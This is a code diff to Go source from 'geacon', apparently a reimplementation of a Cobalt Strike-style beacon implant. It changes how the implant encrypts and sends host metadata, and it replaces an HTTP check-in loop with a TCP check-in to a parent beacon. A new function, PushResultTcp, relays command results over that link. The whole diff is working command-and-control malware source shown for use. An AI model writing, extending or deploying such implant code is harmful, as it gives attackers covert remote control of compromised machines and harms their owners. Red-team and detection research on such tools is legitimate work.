@@ -13,14 +13,15 @@ import (
 	"geacon/cmd/util"
 	"strconv"
 	"strings"
-	"time"
 	"math/rand"
+	"net"
+	"time"
 
 	"github.com/imroc/req"
 )
 
 var (
-	encryptedMetaInfo string
+	encryptedMetaInfo []byte
 	clientID          int
 )
 
@@ -49,46 +50,28 @@ func ReadLittleInt(b []byte) uint32 {
 	return binary.LittleEndian.Uint32(b)
 }
 
-
 func ReadShort(b []byte) uint16 {
 	return binary.BigEndian.Uint16(b)
 }
 
-func ProfileDecryptPacket(b []byte) []byte {
-	// first base64decode, then unmask
-	xored := make([]byte, base64.URLEncoding.WithPadding(base64.NoPadding).DecodedLen(len(b)))
-	_, err := base64.URLEncoding.WithPadding(base64.NoPadding).Decode(xored, b)
-	if err != nil {
-		fmt.Println("decode error:", err)
-	}
-	// xored, err := base64.URLEncoding.DecodeString(string(b))
-	fmt.Printf("Length of xored data: %d\n", len(xored))
-	fmt.Printf("xored data: %v\n", xored)
-
-	decrypted := unmask(xored)
-
-	fmt.Printf("Length of decoded data: %d\n", len(decrypted))
-	fmt.Printf("%v\n", decrypted)
-
-	return decrypted
+func WriteShort(nInt int) []byte {
+	bBytes := make([]byte, 2)
+	binary.BigEndian.PutUint16(bBytes, uint16(nInt))
+	return bBytes
 }
 
 func DecryptPacket(b []byte) ([]byte, bool) {
 
 	hmacVerfied := false
 
-	decrypted := ProfileDecryptPacket(b)
-
 	// if the data length is greater than 0, then we received a command!
 	// Otherwise, it is just an acceptance of our checkin request, and as such does not contain a command nor an HMAC
-	if len(decrypted) > 0 {
-			// last 16 Bytes are the HMAC 
-		// hmacHash := decrypted[:len(decrypted)-crypt.HmacHashLen]
-		hmacHash := decrypted[len(decrypted)-crypt.HmacHashLen:]
+	if len(b) > 0 {
+		// last 16 Bytes are the HMAC 
+		hmacHash := b[len(b)-crypt.HmacHashLen:]
 
 		fmt.Printf("hmac hash: %v\n", hmacHash)
-		// restBytes := decrypted[len(decrypted)-crypt.HmacHashLen:]
-		restBytes := decrypted[:len(decrypted)-crypt.HmacHashLen]
+		restBytes := b[:len(b)-crypt.HmacHashLen]
 		fmt.Printf("%v\n", restBytes)
 
 		//TODO check the hmachash
@@ -202,7 +185,7 @@ func MakePacket(replyType int, b []byte) []byte {
 
 }
 
-func EncryptedMetaInfo() string {
+func EncryptedMetaInfo() []byte {
 	packetUnencrypted := MakeMetaInfo()
 	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
 	if err != nil {
@@ -210,7 +193,7 @@ func EncryptedMetaInfo() string {
 	}
 
 	//TODO c2profile encode method
-	finalPacket := string(EncryptPacket(packetEncrypted))
+	finalPacket := packetEncrypted
 	return finalPacket
 }
 
@@ -314,28 +297,22 @@ func MakeMetaInfo() []byte {
 	return packetToEncrypt
 }
 
-func FirstBlood() bool {
+func InitialMetaInfo() {
 	encryptedMetaInfo = EncryptedMetaInfo()
-	for {
-		resp := HttpGet(config.GetUrl, encryptedMetaInfo)
-		if resp != nil {
-			fmt.Printf("firstblood: %v\n", resp)
-			fmt.Printf("firstblood body: %x\n", resp.Bytes())
-			break
-		}
-		time.Sleep(500 * time.Millisecond)
-	}
-	time.Sleep(config.WaitTime)
+}
+
+func FirstBlood(conn net.Conn) bool {
+	PushResultTcp(conn, append(WriteLittleInt(clientID), encryptedMetaInfo...))
 	return true
 }
 
-func PullCommand() *req.Resp {
-	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedMetaInfo)
-	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
-	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
-	fmt.Printf("%v \n", resp)
-	return resp
-}
+// func PullCommand() *req.Resp {
+// 	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedMetaInfo)
+// 	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
+// 	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+// 	fmt.Printf("%v \n", resp)
+// 	return resp
+// }
 
 func PullChainCommand(encryptedChainMetaInfo []byte) *req.Resp {
 	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedChainMetaInfo)
@@ -353,6 +330,14 @@ func PushResult(b []byte) *req.Resp {
 	resp := HttpPost(url, b)
 	fmt.Printf("pushresult: %v\n", resp.Request().URL)
 	return resp
+}
+
+func PushResultTcp(conn net.Conn, b []byte) {
+	// push result by first sending the length of our payload to the parent beacon, followed by the payload
+	bLenBytes := WriteLittleInt(len(b))
+	conn.Write(bLenBytes)
+	time.Sleep(100 * time.Millisecond)
+	conn.Write(b)
 }
 
 // old idea, that was stupid in hindsight: create a new push request for each beacon that we link to
